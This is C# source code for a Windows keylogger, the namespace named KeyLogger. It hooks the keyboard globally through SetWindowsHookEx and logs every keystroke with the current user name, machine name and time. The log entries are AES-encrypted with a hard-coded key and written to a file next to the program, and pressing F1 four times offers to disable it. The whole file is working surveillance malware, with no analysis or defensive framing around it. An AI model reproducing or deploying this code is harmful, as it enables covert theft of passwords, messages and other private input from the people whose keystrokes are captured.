using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;
using System.Net;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace KeyLogger
{
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static int _killSwitch = 0;
        private static string _fileName ="//logs";
        private static byte[] _pass0 = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
        private static byte[] _pass1 = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
        public static void Main()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);

        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                KillSwitch((Keys)vkCode == Keys.F1); 
                StreamWriter sw = new StreamWriter(Application.StartupPath + "\\" + _fileName, true);
                sw.WriteLine(Encryptor(
                    $"[{System.Security.Principal.WindowsIdentity.GetCurrent().Name}" +
                    $" {Environment.MachineName} {DateTime.Now.ToString()}] {(Keys)vkCode}"
                    ));
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static void KillSwitch(bool flag)
        {
            if (flag)
            {
                if (++_killSwitch == 4)
                {
                    var res = MessageBox.Show("Disable it?", "KeyLogger",
                        MessageBoxButtons.YesNo, MessageBoxIcon.Error);
                    if (res == DialogResult.Yes)
                    {
                        Application.Exit();
                    }
                    _killSwitch = 0;
                }
            }
            else
            {
                _killSwitch = 0;
            }
        }
        public static string Encryptor(string text)
        {
            var aes = Aes.Create();
            var key = aes.CreateEncryptor(_pass0, _pass1);
            MemoryStream mem = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(mem, key, CryptoStreamMode.Write);
            StreamWriter streamWriter = new StreamWriter(cryptoStream);
            streamWriter.Write(text);
            streamWriter.Close();
            return Convert.ToBase64String(mem.ToArray());
        }


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

    }

}
